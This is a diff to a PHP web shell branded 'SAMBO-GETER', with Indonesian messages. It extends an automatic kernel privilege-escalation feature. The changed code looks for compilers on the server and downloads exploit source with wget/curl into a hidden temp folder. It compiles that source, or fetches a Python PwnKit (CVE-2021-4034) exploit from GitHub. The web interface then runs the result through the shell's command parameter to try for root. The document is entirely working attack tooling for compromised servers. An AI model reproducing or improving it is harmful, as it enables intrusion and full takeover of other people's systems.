@@ -2103,21 +2103,27 @@ function scan_env_variables() {
 }
 
 function auto_compile_kernel_exploit($cve, $kernel_version) {
-    $results = ['success' => false, 'output' => '', 'compiled_binary' => ''];
+    $results = ['success' => false, 'output' => '', 'compiled_binary' => '', 'method' => ''];
+    $arch = php_uname('m');
+    $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
+    @mkdir($tmp_dir);
     
-    // Check if gcc is available
-    $gcc_check = execute_shell_command("which gcc 2>/dev/null || echo 'NOT_FOUND'");
-    if (strpos($gcc_check, 'NOT_FOUND') !== false) {
-        $results['output'] = "❌ GCC tidak tersedia di server ini!\n\n";
-        $results['output'] .= "Server: " . php_uname() . "\n";
-        $results['output'] .= "GCC: NOT INSTALLED\n\n";
-        $results['output'] .= "⚠️ Compile tidak dapat dilakukan.\n\n";
-        $results['output'] .= "Alternatif:\n";
-        $results['output'] .= "1. Cari pre-compiled binary exploit\n";
-        $results['output'] .= "2. Upload binary dari mesin lain (same arch)\n";
-        $results['output'] .= "3. Gunakan metode privilege escalation lain\n\n";
-        $results['output'] .= "Architecture: " . php_uname('m') . "\n";
-        return $results;
+    // 🔥 FULL AUTO MODE - Try multiple methods automatically
+    $results['output'] = "🔥 FULL AUTO KERNEL EXPLOIT\n";
+    $results['output'] .= "Target: $cve | Arch: $arch\n";
+    $results['output'] .= str_repeat("=", 50) . "\n\n";
+    
+    // METHOD 1: Check for existing system compilers
+    $results['output'] .= "[1/5] Checking for system compilers...\n";
+    $compilers = ['gcc', 'clang', 'tcc', 'cc'];
+    $compiler = null;
+    foreach ($compilers as $c) {
+        $check = execute_shell_command("which $c 2>/dev/null");
+        if (!empty($check) && strpos($check, 'which') === false) {
+            $compiler = trim($check);
+            $results['output'] .= "✅ Found: $compiler\n";
+            break;
+        }
     }
     
     // 🔥 EXTENSIVE AUTO-COMPILE DATABASE - 15+ Exploits
@@ -2294,105 +2300,108 @@ function auto_compile_kernel_exploit($cve, $kernel_version) {
     ];
     
     if (!isset($exploit_db[$cve])) {
-        $results['output'] = "Exploit $cve not in auto-compile database. Manual compilation required.";
+        $results['output'] .= "❌ CVE tidak ada di database\n";
         return $results;
     }
     
     $exploit = $exploit_db[$cve];
-    $tmp_dir = sys_get_temp_dir() . '/.exploit_' . time();
-    @mkdir($tmp_dir);
     
-    // Download source dengan better error handling dan fallback
-    $source_file = $tmp_dir . '/exploit.c';
-    $source_content = false;
-    
-    // Try file_get_contents first
-    $source_content = @file_get_contents($exploit['source']);
-    
-    // Fallback to curl if file_get_contents fails
-    if (!$source_content && function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $exploit['source']);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
-        $source_content = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
+    // METHOD 2: If compiler available, download and compile
+    if ($compiler) {
+        $results['output'] .= "[2/5] Downloading source...\n";
+        $source_file = $tmp_dir . '/exploit.c';
+        $source_content = @file_get_contents($exploit['source']);
         
-        if ($http_code != 200) {
-            $source_content = false;
+        if (!$source_content) {
+            // Fallback to wget/curl
+            $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>/dev/null || curl -sL " . escapeshellarg($exploit['source']) . " 2>/dev/null";
+            $source_content = execute_shell_command($wget_cmd);
         }
-    }
-    
-    // Fallback to wget/curl system command
-    if (!$source_content) {
-        $wget_cmd = "wget -qO- " . escapeshellarg($exploit['source']) . " 2>/dev/null || curl -sL " . escapeshellarg($exploit['source']) . " 2>/dev/null";
-        $source_content = execute_shell_command($wget_cmd);
-        if (empty($source_content) || strlen($source_content) < 100) {
-            $source_content = false;
+        
+        if ($source_content && strlen($source_content) > 100 && strpos($source_content, '<html') === false) {
+            @file_put_contents($source_file, $source_content);
+            $results['output'] .= "✅ Source downloaded (" . strlen($source_content) . " bytes)\n";
+            
+            // Compile
+            $results['output'] .= "[3/5] Compiling with $compiler...\n";
+            $compile_cmd = str_replace(['gcc', 'exploit.c', 'poc.c', '/tmp/'], [$compiler, $source_file, $source_file, $tmp_dir], $exploit['compile_cmd']);
+            $compile_output = execute_shell_command("cd $tmp_dir && $compile_cmd 2>&1");
+            
+            // Check binary
+            $binary_name = basename(str_replace("$compiler -o ", '', explode(' ', $compile_cmd)[0]));
+            $binary_path = $tmp_dir . '/' . $binary_name;
+            
+            if (file_exists($binary_path)) {
+                chmod($binary_path, 0755);
+                $results['success'] = true;
+                $results['compiled_binary'] = $binary_path;
+                $results['method'] = 'compile';
+                $results['output'] .= "✅ COMPILE SUCCESS!\n";
+                $results['output'] .= "Binary: $binary_path\n";
+                $results['output'] .= "Execute: $binary_path\n\n";
+                return $results;
+            } else {
+                $results['output'] .= "❌ Compile failed\n$compile_output\n\n";
+            }
+        } else {
+            $results['output'] .= "❌ Download failed\n\n";
         }
-    }
-    
-    // Check HTTP response code
-    $headers = @get_headers($exploit['source']);
-    $http_code = 0;
-    if ($headers && isset($headers[0])) {
-        preg_match('/HTTP\/\d\.\d\s+(\d+)/', $headers[0], $matches);
-        $http_code = isset($matches[1]) ? intval($matches[1]) : 0;
-    }
-    
-    if (!$source_content || $http_code === 404) {
-        $results['output'] = "❌ Failed to download exploit source (HTTP $http_code)\n";
-        $results['output'] .= "URL: {$exploit['source']}\n\n";
-        $results['output'] .= "⚠️ Repository mungkin telah dipindahkan atau dihapus.\n";
-        $results['output'] .= "Coba cari manual di:\n";
-        $results['output'] .= "• https://github.com/search?q=$cve\n";
-        $results['output'] .= "• https://www.exploit-db.com/search?cve=$cve\n";
-        $results['output'] .= "• https://packetstormsecurity.com/search/?q=$cve\n\n";
-        $results['output'] .= "Setelah menemukan source, upload manual ke /tmp/ dan compile.";
-        return $results;
-    }
-    
-    // Verify content is valid C code, not error page
-    if (strpos($source_content, '<!DOCTYPE') !== false || 
-        strpos($source_content, '<html') !== false ||
-        strlen($source_content) < 100) {
-        $results['output'] = "❌ Downloaded content is not valid source code\n";
-        $results['output'] .= "Received HTML page instead of C source.\n";
-        $results['output'] .= "URL may have changed or requires authentication.";
-        return $results;
-    }
-    
-    @file_put_contents($source_file, $source_content);
-    
-    // Compile - adjust filename references in compile command
-    $compile_cmd = str_replace('dirtyc0w.c', $source_file, $exploit['compile_cmd']);
-    $compile_cmd = str_replace('exploit.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('poc.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('pwn.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('ptmx.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('cve-2021-4034.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('cve-2020-8835.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('cve-2017-16995.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('CVE-2022-0995.c', $source_file, $compile_cmd);
-    $compile_cmd = str_replace('/tmp/', $tmp_dir . '/', $compile_cmd);
-    
-    $compile_output = execute_shell_command("cd $tmp_dir && $compile_cmd 2>&1");
-    
-    // Check if binary was created
-    $binary_name = basename(str_replace('gcc -o ', '', explode(' ', $compile_cmd)[0]));
-    $binary_path = $tmp_dir . '/' . $binary_name;
-    
-    if (file_exists($binary_path)) {
-        chmod($binary_path, 0755);
-        $results['success'] = true;
-        $results['compiled_binary'] = $binary_path;
-        $results['output'] = "Successfully compiled {$exploit['name']}\nBinary: $binary_path\n\nCompile output:\n$compile_output";
     } else {
-        $results['output'] = "Compilation failed:\n$compile_output";
+        $results['output'] .= "❌ No compiler found\n\n";
     }
+    
+    // METHOD 3: Try Python-based exploits
+    $results['output'] .= "[4/5] Checking Python availability...\n";
+    $python = execute_shell_command("which python3 2>/dev/null || which python 2>/dev/null");
+    if (!empty($python)) {
+        $python = trim($python);
+        $results['output'] .= "✅ Found: $python\n";
+        
+        // For CVE-2021-4034 (PwnKit), try Python version
+        if ($cve === 'CVE-2021-4034') {
+            $py_exploit = 'https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py';
+            $py_content = @file_get_contents($py_exploit);
+            if (!$py_content) {
+                $py_content = execute_shell_command("wget -qO- $py_exploit 2>/dev/null || curl -sL $py_exploit 2>/dev/null");
+            }
+            if ($py_content && strlen($py_content) > 100) {
+                $py_file = $tmp_dir . '/pwnkit.py';
+                @file_put_contents($py_file, $py_content);
+                chmod($py_file, 0755);
+                $results['success'] = true;
+                $results['compiled_binary'] = $py_file;
+                $results['method'] = 'python';
+                $results['output'] .= "✅ PYTHON EXPLOIT DOWNLOADED!\n";
+                $results['output'] .= "Execute: $python $py_file\n\n";
+                return $results;
+            }
+        }
+    }
+    
+    // METHOD 4: Search for pre-compiled binaries on system
+    $results['output'] .= "[5/5] Searching for existing binaries...\n";
+    $search_paths = ['/usr/bin', '/bin', '/usr/local/bin', '/opt', '/tmp', '/var/tmp'];
+    foreach ($search_paths as $path) {
+        if (is_dir($path)) {
+            $files = @scandir($path);
+            if ($files) {
+                foreach ($files as $file) {
+                    // Look for suspicious binaries that might be exploits
+                    if (preg_match('/(exploit|privesc|root|shell)/i', $file) && is_executable("$path/$file")) {
+                        $results['output'] .= "⚠️ Found: $path/$file (suspicious name)\n";
+                    }
+                }
+            }
+        }
+    }
+    
+    // ALL METHODS FAILED
+    $results['output'] .= "\n❌ ALL AUTO METHODS FAILED\n\n";
+    $results['output'] .= "Alternatives:\n";
+    $results['output'] .= "1. Upload pre-compiled binary manually\n";
+    $results['output'] .= "2. Use container escape (if in Docker)\n";
+    $results['output'] .= "3. Try SUID/sudo exploits (no compile needed)\n";
+    $results['output'] .= "4. Download binary from: https://github.com/berdav/CVE-2021-4034/releases\n";
     
     return $results;
 }
@@ -3301,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒜 𝑀 𝐵 𝒪 - 𝒢 𝐸 𝒯 𝐸 𝑅:: ~ 280326 2112</h1>
+        <h1>::𝒮 𝒜 𝑀 𝐵 𝒪 - 𝒢 𝐸 𝒯 𝐸 𝑅:: ~ 280326 2124</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -6551,15 +6560,21 @@ async function kernelAutoCompile() {
         const data = await response.json();
         
         if (data.success) {
-            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Compilation successful!</span>\n';
-            outputDiv.innerHTML += '<span style="color:#6cf;">Binary: ' + data.compiled_binary + '</span>\n';
+            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Auto-deploy successful!</span>\n';
+            outputDiv.innerHTML += '<span style="color:#6cf;">Method: ' + (data.method || 'binary') + '</span>\n';
+            outputDiv.innerHTML += '<span style="color:#6cf;">Path: ' + data.compiled_binary + '</span>\n';
             outputDiv.innerHTML += '\n<span style="color:#ff0;">Output:</span>\n' + data.output + '\n';
             
             statusDiv.innerHTML = '⏳ Phase 3/3: Executing exploit...';
             
-            // Execute the compiled binary
+            // Execute based on method type
+            let execCmd = data.compiled_binary;
+            if (data.method === 'python') {
+                execCmd = 'python3 ' + data.compiled_binary + ' || python ' + data.compiled_binary;
+            }
+            
             const execForm = new FormData();
-            execForm.append('cmd', data.compiled_binary);
+            execForm.append('cmd', execCmd);
             execForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
             
             const execResponse = await fetch('', { method: 'POST', body: execForm });
@@ -6578,9 +6593,9 @@ async function kernelAutoCompile() {
                 statusDiv.innerHTML = '⚠️ Exploit executed but no root';
             }
         } else {
-            outputDiv.innerHTML += '<span style="color:#f44;">❌ Compilation failed:</span>\n' + data.output + '\n';
+            outputDiv.innerHTML += '\n<span style="color:#f44;">❌ Auto-deploy failed:</span>\n' + data.output + '\n';
             statusDiv.className = 'privesc-status error';
-            statusDiv.innerHTML = '❌ Compilation failed';
+            statusDiv.innerHTML = '❌ All auto methods failed';
         }
     } catch (err) {
         outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
